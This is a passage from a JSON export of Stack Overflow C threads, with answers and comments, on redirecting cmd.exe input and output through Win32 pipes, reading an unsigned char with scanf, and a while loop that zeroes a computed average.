"https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 0, "creation_date": 1444893680, "post_id": 33132689, "comment_id": 54094593, "body": "<code>WriteFile</code> cannot return <code>ERROR_IO_PENDING</code>, unless it is used asynchronously. Checking the return value against <code>ERROR_IO_PENDING</code> for a synchronous write operation doesn&#39;t make sense."}, {"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "edited": false, "score": 0, "creation_date": 1444894514, "post_id": 33132689, "comment_id": 54095095, "body": "well, i mentioned that the code is garbage :). the main problem has been solved."}, {"owner": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 0, "creation_date": 1444895695, "post_id": 33132689, "comment_id": 54095759, "body": "I didn&#39;t mention it, because it seemed obvious to me: Stackoverflow isn&#39;t exactly about posting garbage answers. You may wish to take the <a href=\"http://stackoverflow.com/tour\">tour</a> to find out, what stackoverflow is. (It&#39;s not about posting more than one answer to a question either; there&#39;s an <a href=\"http://stackoverflow.com/posts/33131283/edit\">edit</a> link on your answers for a reason.)"}, {"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "edited": false, "score": 0, "creation_date": 1444901305, "post_id": 33132689, "comment_id": 54099303, "body": "@ IInspectable, i didn&#39;t post garbage answer, garbage answers do not resolve problems. a garbage code is not a garbage answer. it is a code that contains unnecessary code (unclean). the point is to answer the question not to deliver a well designed code. there is also the possibility to refine the code by any one who wish to participate positively. just click on edit button, i will not mind at all."}], "tags": [], "owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "is_accepted": true, "score": -2, "last_activity_date": 1444846506, "creation_date": 1444846506, "answer_id": 33132689, "question_id": 33130522, "link": "https://stackoverflow.com/questions/33130522/redirecting-cmd-exe-output-and-input-in-c-through-pipes/33132689#33132689", "title": "Redirecting CMD.exe output and input in c through pipes", "body": "<p>put ReadFromPipe() in a separate Thread;\nmy code here is a garbage but it is working code, it is for test purpose only.</p>\n\n<pre><code>#include &lt;windows.h&gt; \n#include &lt;tchar.h&gt;\n#include &lt;stdio.h&gt; \n#include &lt;strsafe.h&gt;\n\n#define BUFSIZE 4096 \n\nHANDLE g_hChildStd_IN_Rd = NULL;\nHANDLE g_hChildStd_IN_Wr = NULL;\nHANDLE g_hChildStd_OUT_Rd = NULL;\nHANDLE g_hChildStd_OUT_Wr = NULL;\n\nHANDLE g_hInputFile = NULL;\n\nint CreateChildProcess(TCHAR *szCmdline);\n\nvoid PrintError(char *text,int err);\nint InitPipes();\n\n\nint WriteToPipe(char* command){\n    DWORD dwRead, dwWritten;\n    BOOL bSuccess = FALSE;\n    SetLastError(0);\n    WriteFile(g_hChildStd_IN_Wr, command, strlen(command), &amp;dwWritten, NULL);\n\n\n    bSuccess=GetLastError();\n\n    PrintError(\"WriteToPipe\",bSuccess);\n    return (bSuccess==0)||(bSuccess==ERROR_IO_PENDING);\n}\n\nint ReadFromPipe(void){\n    DWORD dwRead, dwWritten;\n    CHAR chBuf[BUFSIZE];\n    BOOL bSuccess = FALSE;\n    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    SetLastError(0);\n    while(\n        ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &amp;dwRead, NULL)\n        &amp;&amp;\n        WriteFile(hParentStdOut, chBuf, dwRead, &amp;dwWritten, NULL)\n        );\n\n    bSuccess=GetLastError();\n    PrintError(\"ReadFromPipe\",bSuccess);\n\n\n    return (bSuccess==0)||(bSuccess==ERROR_IO_PENDING);\n}\n\nHANDLE hThread;\n\nint __stdcall ThreadProc(int arg){\n\n    while(ReadFromPipe())\n        ;\n\n    return 0;\n}\n\nint main(){\n    char input_buffer[100] = { 0 };\n    if(!InitPipes()){\n        printf(\"Failed to CreatePipes\\n\");\n        return -1;\n    }\n\n    if(!CreateChildProcess(\"cmd.exe\")){\n        printf(\"Failed to create child process\\n\");\n        return -2;\n    }\n\n\n    hThread=CreateThread(NULL,0,ThreadProc,NULL,0,NULL);\n\n    while (1){\n        fgets(input_buffer, 99, stdin);\n        if(!WriteToPipe(input_buffer)) break;\n    }\n    printf(\"Program terminated\\n\");\n    return 0;\n}\n\n\n\n\n\nint CreateChildProcess(TCHAR *szCmdline){ \n\n   PROCESS_INFORMATION piProcInfo; \n   STARTUPINFO siStartInfo;\n   BOOL bSuccess = FALSE; \n\n// Set up members of the PROCESS_INFORMATION structure. \n\n   ZeroMemory( &amp;piProcInfo, sizeof(PROCESS_INFORMATION) );\n\n// Set up members of the STARTUPINFO structure. \n// This structure specifies the STDIN and STDOUT handles for redirection.\n\n   ZeroMemory( &amp;siStartInfo, sizeof(STARTUPINFO) );\n   siStartInfo.cb = sizeof(STARTUPINFO); \n   siStartInfo.hStdError = g_hChildStd_OUT_Wr;\n   siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;\n   siStartInfo.hStdInput = g_hChildStd_IN_Rd;\n   siStartInfo.dwFlags |= STARTF_USESTDHANDLES;\n\n// Create the child process. \n\n   bSuccess = CreateProcess(NULL, \n      szCmdline,     // command line \n      NULL,          // process security attributes \n      NULL,          // primary thread security attributes \n      TRUE,          // handles are inherited \n      0,             // creation flags \n      NULL,          // use parent's environment \n      NULL,          // use parent's current directory \n      &amp;siStartInfo,  // STARTUPINFO pointer \n      &amp;piProcInfo);  // receives PROCESS_INFORMATION \n\n   // If an error occurs, exit the application. \n   if (  bSuccess ){\n      // Close handles to the child process and its primary thread.\n      // Some applications might keep these handles to monitor the status\n      // of the child process, for example. \n\n      CloseHandle(piProcInfo.hProcess);\n      CloseHandle(piProcInfo.hThread);\n   }\n    return bSuccess;\n}\n\n\n\nint InitPipes(){\n   SECURITY_ATTRIBUTES saAttr; \n\n// Set the bInheritHandle flag so pipe handles are inherited. \n\n   saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); \n   saAttr.bInheritHandle = TRUE; \n   saAttr.lpSecurityDescriptor = NULL; \n\n\n\n   if ( ! CreatePipe(&amp;g_hChildStd_OUT_Rd, &amp;g_hChildStd_OUT_Wr, &amp;saAttr, 0) ) \n      return 0;\n\n   if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )\n      return 0;\n\n   if (! CreatePipe(&amp;g_hChildStd_IN_Rd, &amp;g_hChildStd_IN_Wr, &amp;saAttr, 0)) \n      return 0;\n\n   if ( ! SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0) )\n      return 0; \n\n    return 1;\n}\n\n\n\n\n\nvoid PrintError(char *text,int err){\n     DWORD retSize;\n     LPTSTR pTemp=NULL;\n\n    if(!err) return;\n\n     retSize=FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER|\n                           FORMAT_MESSAGE_FROM_SYSTEM|\n                           FORMAT_MESSAGE_ARGUMENT_ARRAY,\n                           NULL,\n                           err,\n                           LANG_NEUTRAL,\n                           (LPTSTR)&amp;pTemp,\n                           0,\n                           NULL );\n\n\n    if(pTemp) printf(\"%s: %s\\n\",text,pTemp);\n     LocalFree((HLOCAL)pTemp);\n    return ;\n\n}\n</code></pre>\n"}], "owner": {"reputation": 83, "user_id": 5277702, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a3b2ed5cf90661e8c84928ecd5705d01?s=128&d=identicon&r=PG&f=1", "display_name": "test123423", "link": "https://stackoverflow.com/users/5277702/test123423"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 759, "favorite_count": 0, "accepted_answer_id": 33132689, "answer_count": 2, "score": -1, "last_activity_date": 1444846506, "creation_date": 1444839373, "last_edit_date": 1495535364, "question_id": 33130522, "link": "https://stackoverflow.com/questions/33130522/redirecting-cmd-exe-output-and-input-in-c-through-pipes", "title": "Redirecting CMD.exe output and input in c through pipes", "body": "<p>Im trying to print the output and input of cmd commands recieved to stdout just like a normal cmd.exe would do.\nI could use the function <code>_popen</code> but when i start a program like Python or Powershell whith it, it doesnt work. <strong>So i Need the Output of the child process and be able to send commands to the child process.</strong></p>\n\n<p>there is a simmilar question <a href=\"https://stackoverflow.com/questions/6722005/redirect-cmd-exe-output-to-a-pipe\">here</a></p>\n\n<p>So i modified the code from <a href=\"https://msdn.microsoft.com/de-de/library/windows/desktop/ms682499(v=vs.85).aspx\" rel=\"nofollow noreferrer\">this</a> link to look like this:</p>\n\n<pre><code>void WriteToPipe(char* command){\n    DWORD dwRead, dwWritten;\n    BOOL bSuccess = FALSE;\n\n    bSuccess = WriteFile(g_hChildStd_IN_Wr, command, strlen(command), &amp;dwWritten, NULL);\n\n    // Close the pipe handle so the child process stops reading. \n\n    if (!CloseHandle(g_hChildStd_IN_Wr))\n        ErrorExit(TEXT(\"StdInWr CloseHandle\"));\n}\n\nvoid ReadFromPipe(void){\n    DWORD dwRead, dwWritten;\n    CHAR chBuf[BUFSIZE];\n    BOOL bSuccess = FALSE;\n    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &amp;dwRead, NULL);\n    bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &amp;dwWritten, NULL);\n    //bSuccess = PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, BUFSIZE, &amp;dwRead, &amp;dwTotalAvailBytes, &amp;dwBytesLeft);\n}\n</code></pre>\n\n<p>the main loop looks like this:</p>\n\n<pre><code>CreateChildProcess(\"C:\\\\Python27\\\\python.exe\");\nchar input_buffer[100] = { 0 };\nwhile (1){\n    fgets(input_buffer, 99, stdin);\n    WriteToPipe(input_buffer);\n    ReadFromPipe();\n}\n</code></pre>\n\n<p>everything else (from the code) stayed the same.</p>\n\n<p>Now my Problem is, i want to enter multiple commands to the same process, but there is a CloseHandle fucntion in WriteToPipe, after the handle is closed i cant enter more commands.</p>\n\n<p><strong>How to get a valid HANDLE to write more than 1 command to the process ?</strong></p>\n"}, {"tags": ["c", "unsigned"], "comments": [{"owner": {"reputation": 5380, "user_id": 376371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb9fc14191bcdb710343fdf049912ec2?s=128&d=identicon&r=PG&f=1", "display_name": "Erik Godard", "link": "https://stackoverflow.com/users/376371/erik-godard"}, "edited": false, "score": 1, "creation_date": 1444839311, "post_id": 33130445, "comment_id": 54072728, "body": "A char is just one character, you need an array of chars."}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1444839389, "post_id": 33130445, "comment_id": 54072774, "body": "Sure a 16 bit value fits into an <code>unsigned char</code>?"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1444839591, "post_id": 33130445, "comment_id": 54072900, "body": "What compiler are you using? Dial the warning level to the maximum and read all the warnings."}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 0, "last_activity_date": 1444839689, "last_edit_date": 1444839689, "creation_date": 1444839304, "answer_id": 33130487, "question_id": 33130445, "link": "https://stackoverflow.com/questions/33130445/how-do-i-scan-and-print-an-unsigned-char-in-c/33130487#33130487", "title": "How do I scan and print an Unsigned Char in C?", "body": "<p>In your code</p>\n\n<pre><code> scanf(\"%s, &amp;x);\n</code></pre>\n\n<p>invokes undefined behavior. <code>x</code>is of type <code>char</code> and you cannot use <code>%s</code> to scan the value.</p>\n\n<p>What you need is to define a <code>char</code> array at least to be able to hold your expected input.</p>\n\n<p>If you like to have a second approach, you can do something like</p>\n\n<ul>\n<li>scan the input as (unsigned) integer using <code>%x</code></li>\n<li>print the same using <code>%#X</code> format specifier.</li>\n</ul>\n\n<p><strong><a href=\"http://rextester.com/CITJMT38917\" rel=\"nofollow\">See it <kbd>live</kbd></a></strong></p>\n"}, {"tags": [], "owner": {"reputation": 5541, "user_id": 4367864, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/mIepQ.png?s=128&g=1", "display_name": "PC Luddite", "link": "https://stackoverflow.com/users/4367864/pc-luddite"}, "is_accepted": false, "score": 0, "last_activity_date": 1444839508, "creation_date": 1444839508, "answer_id": 33130578, "question_id": 33130445, "link": "https://stackoverflow.com/questions/33130445/how-do-i-scan-and-print-an-unsigned-char-in-c/33130578#33130578", "title": "How do I scan and print an Unsigned Char in C?", "body": "<p>A string is an array of characters terminated by <code>'\\0'</code>. You're reading a string into a single character, which is undefined behavior.</p>\n\n<p>Your code should really look something like this:</p>\n\n<pre><code>unsigned char x[64];\nprintf(\"Input x:\");\nscanf(\"%63s, x); /* use the size of buffer to prevent buffer overflows */\n\nprintf(\"%s\", x);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444839554, "post_id": 33130584, "comment_id": 54072881, "body": "<code>%d</code> or <code>%u</code> can be used ?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1444840091, "post_id": 33130584, "comment_id": 54073209, "body": "You&#39;re right, but I don&#39;t think this is what OP intends to do."}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 1, "last_activity_date": 1444841371, "last_edit_date": 1444841371, "creation_date": 1444839523, "answer_id": 33130584, "question_id": 33130445, "link": "https://stackoverflow.com/questions/33130445/how-do-i-scan-and-print-an-unsigned-char-in-c/33130584#33130584", "title": "How do I scan and print an Unsigned Char in C?", "body": "<p>You need to use <code>\"%hhu\"</code> as the format specifier to read an <code>unsigned char</code>. See the table at <a href=\"http://en.cppreference.com/w/c/io/fscanf\" rel=\"nofollow\">http://en.cppreference.com/w/c/io/fscanf</a>.</p>\n\n<pre><code>unsigned char x;\nprintf(\"Input x:\");\nscanf(\"%hhu\", &amp;x);\n</code></pre>\n\n<p>Note that if you use this format specifier, the input has to be a number. It cannot be a character. <code>65</code> will be a valid input but <code>A</code> won't.</p>\n\n<p>Coming to your problem of wanting to use <code>0xABCD</code> as input, that value is too large to fit into an <code>unsigned char</code>. You can use:</p>\n\n<pre><code>unsigned x;\nprintf(\"Input x:\");\nscanf(\"%x\", &amp;x);\n</code></pre>\n\n<p>To print that number as <code>0xABCD</code>, you can use:</p>\n\n<pre><code>printf(\"0x%X\\n\", x);\n</code></pre>\n\n<p>If you don't mind the number being printed as <code>0xabcd</code>, you can use:</p>\n\n<pre><code>printf(\"%#x\\n\", x);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "is_accepted": false, "score": 0, "last_activity_date": 1444839712, "creation_date": 1444839712, "answer_id": 33130650, "question_id": 33130445, "link": "https://stackoverflow.com/questions/33130445/how-do-i-scan-and-print-an-unsigned-char-in-c/33130650#33130650", "title": "How do I scan and print an Unsigned Char in C?", "body": "<p>In any ways \"0xABCD\" can't be treated as a 'char'. A char can store a 8 bit value, so from 0 to 255 (if unsigned), and the given number 0xABCD is equal to 43981.</p>\n\n<p>You can read it as a string or read it as a hexadecimal value (which must be an unsigned). For this case an example:</p>\n\n<pre><code>unsigned int x;\nprintf(\"Number: \");\nscanf(\"%x\", &amp;x);\nprintf(\"%d / %X\\n\", x, x);\n</code></pre>\n\n<p>will give:</p>\n\n<pre><code>Number: 0xABCD\n43981 / ABCD\n</code></pre>\n\n<p>If treated as a string you will have to treat it an other way (sscanf\u2026).</p>\n"}, {"tags": [], "owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "is_accepted": false, "score": 0, "last_activity_date": 1444840231, "creation_date": 1444840231, "answer_id": 33130818, "question_id": 33130445, "link": "https://stackoverflow.com/questions/33130445/how-do-i-scan-and-print-an-unsigned-char-in-c/33130818#33130818", "title": "How do I scan and print an Unsigned Char in C?", "body": "<p>there is no char equivalent, use int instead. </p>\n\n<pre><code>int main(){\n\n    unsigned  int x;\n    printf(\"Input x:\");\n    scanf(\"%x\", &amp;x);\n\n    printf(\"\\n%d (%#x)\\n\", x); \n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5272949, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/bd0d1a2e860bb975daadde8e06528968?s=128&d=identicon&r=PG&f=1", "display_name": "christian.party", "link": "https://stackoverflow.com/users/5272949/christian-party"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5869, "favorite_count": 0, "answer_count": 5, "score": -2, "last_activity_date": 1444841371, "creation_date": 1444839199, "question_id": 33130445, "link": "https://stackoverflow.com/questions/33130445/how-do-i-scan-and-print-an-unsigned-char-in-c", "title": "How do I scan and print an Unsigned Char in C?", "body": "<p>I am trying to ask the user for an input, have that input be set as an unsigned char, and then print it out. For example, the input will ask me \"Input x:\" and I put in 0xABCD as the input. I need it to print out \"0xABCD\" as well.</p>\n\n<p>Here's what I have so far:</p>\n\n<pre><code>unsigned char x;\nprintf(\"Input x:\");\nscanf(\"%s, &amp;x);\n\nprintf(\"%u\", x);\n</code></pre>\n\n<p>It gives me 0 instead of 0xABCD.</p>\n\n<p>What am I doing wrong?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1444839076, "post_id": 33130295, "comment_id": 54072576, "body": "I think you need to read a little more about average, because that&#39;s not what you&#39;re calculating."}, {"owner": {"reputation": 5541, "user_id": 4367864, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/mIepQ.png?s=128&g=1", "display_name": "PC Luddite", "link": "https://stackoverflow.com/users/4367864/pc-luddite"}, "edited": false, "score": 0, "creation_date": 1444839245, "post_id": 33130295, "comment_id": 54072688, "body": "The average is generally the sum of a set, divided by the number in the set. So your average calculation aught to be <code>average = (num1 + num2 + num3) &#47; 3</code>"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1444839278, "post_id": 33130295, "comment_id": 54072705, "body": "That&#39;s an interesting notion of average... anyway, you write <code>while (num1 &gt; 0) { ... num1--; }</code> What do you expect num1 to be after that?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1444839551, "post_id": 33130295, "comment_id": 54072880, "body": "Yet another problem that could have been spotted, and easily fixed, with the most trivial debugging attempts. :("}], "answers": [{"comments": [{"owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1444839213, "post_id": 33130398, "comment_id": 54072667, "body": "Ok, I understand, but I should at least get the number of attempts that was entered because it was entered before the loop."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1444839256, "post_id": 33130398, "comment_id": 54072693, "body": "@Batool Original value is decrementated , you see . Print value of <code>num1</code> in loop and see the values yourself ."}], "tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": false, "score": 0, "last_activity_date": 1444839222, "last_edit_date": 1444839222, "creation_date": 1444839029, "answer_id": 33130398, "question_id": 33130295, "link": "https://stackoverflow.com/questions/33130295/c-program-gives-incorrect-output/33130398#33130398", "title": "C program gives incorrect output?", "body": "<p>Your loop will iterate until <code>num1</code> is greater than <code>0</code> . As it decrement and become <code>0</code> program come out of loop  but <code>num1</code> has value <code>0</code> . Thus ,in these expressions <code>num1</code> is <code>0</code>-</p>\n\n<pre><code>average = num1*num2*num3;    // 0*num2*num3 therefore , 0\naverage_1 = average / 100;    // as average is 0 , thus result is 0\n</code></pre>\n\n<p>Also formula for calculating <code>average_1</code> is wrong . It should be -</p>\n\n<pre><code>average_1=average/3;    // you calculate average of 3 numbers\n</code></pre>\n\n<p>To get correct output create a temporary variable -</p>\n\n<pre><code>int i=num1;\nwhile(i&gt;0){\n // your code \n i--;\n}\n</code></pre>\n\n<p>In this way <code>num1</code> remain unchanged.</p>\n"}, {"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 0, "last_activity_date": 1444839030, "creation_date": 1444839030, "answer_id": 33130399, "question_id": 33130295, "link": "https://stackoverflow.com/questions/33130295/c-program-gives-incorrect-output/33130399#33130399", "title": "C program gives incorrect output?", "body": "<p>You have put the average calculation part in wrong place. Once you're out of the <code>while</code> loop, <code>num1</code> will have a value <code>0</code>, hence all the related calculations will return 0.</p>\n"}, {"tags": [], "owner": {"reputation": 18827, "user_id": 1413133, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hqUmk.jpg?s=128&g=1", "display_name": "Manos Nikolaidis", "link": "https://stackoverflow.com/users/1413133/manos-nikolaidis"}, "is_accepted": false, "score": 0, "last_activity_date": 1444839122, "creation_date": 1444839122, "answer_id": 33130427, "question_id": 33130295, "link": "https://stackoverflow.com/questions/33130295/c-program-gives-incorrect-output/33130427#33130427", "title": "C program gives incorrect output?", "body": "<p>You are reducing <code>num1</code> until it becomes 0</p>\n\n<pre><code>while (num1 &gt; 0) {\n    // other code\n    num1--;\n}\n</code></pre>\n\n<p>Then naturally  </p>\n\n<pre><code> average = num1*num2*num3;\n</code></pre>\n\n<p>becomes  </p>\n\n<pre><code>average = 0*num2*num3;\n</code></pre>\n\n<p>and that is 0</p>\n"}, {"tags": [], "owner": {"reputation": 302, "user_id": 3348903, "user_type": "registered", "accept_rate": 87, "profile_image": "https://graph.facebook.com/100000071776282/picture?type=large", "display_name": "SkyvrawleR", "link": "https://stackoverflow.com/users/3348903/skyvrawler"}, "is_accepted": false, "score": 0, "last_activity_date": 1444839127, "creation_date": 1444839127, "answer_id": 33130428, "question_id": 33130295, "link": "https://stackoverflow.com/questions/33130295/c-program-gives-incorrect-output/33130428#33130428", "title": "C program gives incorrect output?", "body": "<p>First, because you deduct num1 by one till 0.</p>\n\n<p>You should use for loop:</p>\n\n<pre><code>for(int counter = num1; num1 &gt; 0; num--)\n</code></pre>\n\n<p><code>{ Your code here }</code></p>\n"}, {"comments": [{"owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1444839478, "post_id": 33130444, "comment_id": 54072830, "body": "thanks a lot for correction. Can you tell me why while loop did not work in this case, but for loop worked. I am actually learning C programming on my own without any teacher because I work full-time as a System Admin, but I want to add new skills to my career. Thanks!"}, {"owner": {"reputation": 46, "user_id": 4333492, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002246240709/picture?type=large", "display_name": "Filipe Herculano Rocha", "link": "https://stackoverflow.com/users/4333492/filipe-herculano-rocha"}, "reply_to_user": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1444840986, "post_id": 33130444, "comment_id": 54073681, "body": "Well the while loop works this way: &quot;While this condition is true, I&#39;ll continue to do this loop&quot;. So if you have a decrement at the end of the loop and your condition is to stop when it is not greater than 0, at the very last loop stage it will decrement &quot;num1&quot; to 0 and it&#39;ll get off the while statement. Your variable will have the 0 value, instead of the initial one. The &#39;&#39;for&#39;&#39; loop works because I&#39;m using a different variable to change it&#39;s value. The famous &quot;i&quot;. So &quot;num1&quot; continues to have the same value in the beginning of the code."}, {"owner": {"reputation": 46, "user_id": 4333492, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002246240709/picture?type=large", "display_name": "Filipe Herculano Rocha", "link": "https://stackoverflow.com/users/4333492/filipe-herculano-rocha"}, "reply_to_user": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1444841126, "post_id": 33130444, "comment_id": 54073767, "body": "Your while loop could work if you decremented an auxiliary variable!! I suggest you practice programming with a lot of exercises. Search for Online Judges, they will hand you all kinds of easy to difficult problems and you will probably understand more about the particular cases of an specific language. Keep it up and don&#39;t give up!!"}], "tags": [], "owner": {"reputation": 46, "user_id": 4333492, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002246240709/picture?type=large", "display_name": "Filipe Herculano Rocha", "link": "https://stackoverflow.com/users/4333492/filipe-herculano-rocha"}, "is_accepted": true, "score": 0, "last_activity_date": 1445268628, "last_edit_date": 1445268628, "creation_date": 1444839199, "answer_id": 33130444, "question_id": 33130295, "link": "https://stackoverflow.com/questions/33130295/c-program-gives-incorrect-output/33130444#33130444", "title": "C program gives incorrect output?", "body": "<p>You are dicrementing the variable num1. So, when you finish your loop you will have num1 = 0.</p>\n\n<p>I suggest you do a 'for' instead of a 'while'. Like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n\nint num1, i;\ndouble num2,num3,average,average_1;\n\nprintf(\"Enter number of attempts: \");\nscanf(\"%d\", &amp;num1);\n\nfor(i = num1; i &gt; 0; i--) {\n\n        printf(\"Enter your mark for subject one: \");\n        scanf(\"%lf\", &amp;num2);\n\n        printf(\"Enter your mark for subject two: \");\n        scanf(\"%lf\", &amp;num3);\n\n        if (num2 &lt; 50 || num3 &lt; 50) {\n\n                printf(\"You have failed \\n\");\n        }\n        else {\n                printf(\"You have passed \\n\");\n        }\n}\n\naverage = num1*num2*num3;\naverage_1 = average / 100;\nprintf(\"Average for all %d 